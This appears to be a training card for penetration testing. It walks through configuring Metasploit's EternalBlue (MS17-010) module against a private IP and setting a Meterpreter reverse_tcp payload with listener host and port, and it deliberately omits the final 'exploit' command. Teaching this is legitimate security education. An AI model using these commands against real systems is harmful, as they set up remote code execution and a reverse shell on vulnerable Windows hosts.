Terminal demo (read-only)
A canonical setup sequence used to prepare an exploit. Do not run exploit here; this is preparation only.
# Start Metasploit console
msfconsole

# Search for an exploit (e.g., eternalblue)
search eternalblue

# Select a module
use exploit/windows/smb/ms17_010_eternalblue

# Show required options
show options

# Set the target host
set RHOSTS 192.168.1.101

# Show available payloads
show payloads

# Choose a payload and set listener
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444

# Do NOT run 'exploit' in this exercise
Explanation
  • Search locates candidate modules by keyword or vulnerability ID.
  • show options reveals parameters you must set before running a module.
  • Choosing the right payload determines the kind of session you receive if exploitation succeeds.
Supporting cards
Concrete example
Setting RHOSTS to 192.168.1.101 and LHOST to your attacking IP configures the channel for a reverse session without executing the exploit.
Misconception check
A module existing in the database doesn’t imply the target matches the expected environment; verify banners and versions first.
Key Takeaway

Prepare and confirm configuration fully before any attempt to exploit; double-check scope and targets.
